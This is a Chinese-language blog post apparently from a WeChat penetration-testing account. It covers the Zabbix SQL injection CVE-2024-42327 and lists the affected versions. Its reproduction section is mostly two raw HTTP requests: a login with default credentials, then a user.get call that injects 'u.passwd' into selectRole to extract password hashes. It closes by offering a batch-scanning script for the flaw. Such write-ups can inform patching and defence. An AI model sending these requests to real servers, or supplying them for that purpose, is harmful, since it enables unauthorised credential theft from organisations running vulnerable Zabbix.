#  zabbix SQL注入漏洞(CVE-2024-42327)   
原创 菜鸟学渗透  菜鸟学渗透   2024-12-06 03:59  
  
# 一、漏洞描述  
  
Zabbix 前端上具有默认用户角色或任何其他授予 API 访问权限的角色的非管理员用户账户均可利用此漏洞。addRelatedObjects 函数中的 CUser 类中存在 SQLi，此函数由 CUser.get 函数调用，每个具有 API 访问权限的用户均可使用该函数。  
# 二、影响范围  
  
6.0.0 <= Zabbix <= 6.0.31  
  
6.4.0 <= Zabbix <= 6.4.16  
  
Zabbix 7.0.0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZnSwSAE9bQVbzODUXGVGTcrRQGlGn6uX1c4kiajkhBbViaGhLNbYuQDdMb9ibYAFY2qkFlqQYWqcztBw/640?wx_fmt=png&from=appmsg "")  
# 三、漏洞复现  
```
POST /api_jsonrpc.php HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json-rpc
Content-Length: 106
Connection: close
Referer: http://IP/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "Admin", "password": "zabbix"}, "id": 1}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZnSwSAE9bQVbzODUXGVGTcraXzIVbKz6PvcYmUr3LteHePx8aia58zfA2b8UbFFaewMszENboFgfibg/640?wx_fmt=png&from=appmsg "")  
```
POST /api_jsonrpc.php HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json-rpc
Content-Length: 167
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
{"jsonrpc": "2.0", "method": "user.get", "params": {"selectRole": ["roleid, u.passwd", "roleid"], "userids": "1"}, "auth": "6146ec7544c34e008486df010f1a2b6c", "id": 1}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZnSwSAE9bQVbzODUXGVGTcrC6FSfiayZ8iaekzRHgr8fb0wpWLGNriavK3FlWEcAObOnLHdfu08JBShw/640?wx_fmt=png&from=appmsg "")  
  
记得点赞+关注，关注微信公众号  
菜鸟学渗透  
获取最新文章，有任何问题可以后台私信我。  
  
后台回复“python  
-CVE-2024-42327  
”即可获取python批量扫描脚本  
  
有考取NISP一级/二级/三级、CISP-PTE/PTS等证书的可以加我好友私信我（公众号回复“  
加好友  
”）。  
  
  
